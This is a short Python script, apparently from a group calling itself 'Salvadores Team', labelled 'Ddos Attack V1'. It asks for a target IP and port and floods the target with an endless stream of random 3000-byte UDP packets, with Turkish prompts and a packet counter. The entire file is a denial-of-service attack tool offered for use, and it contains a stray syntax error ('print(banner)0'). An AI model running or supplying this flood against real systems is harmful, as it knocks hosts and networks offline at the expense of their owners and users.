import socket
import random
import os
 
os.system
banner="""
####################
#                  #
#  Ddos Attack V1  #
#                  #
####################
karanlik.online ~Salvadores Team
"""
print(banner)0
 
hedef_ip=input("hedef ip: ")
hedef_port=input("hedef port: ")
 
bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
sayac=1
while True:
        sock.sendto(bytes,(hedef_ip,int(hedef_port)))
        sayac=sayac+1
        print("saldiri baslatildi,gonderilen paket:%s"%(sayac))

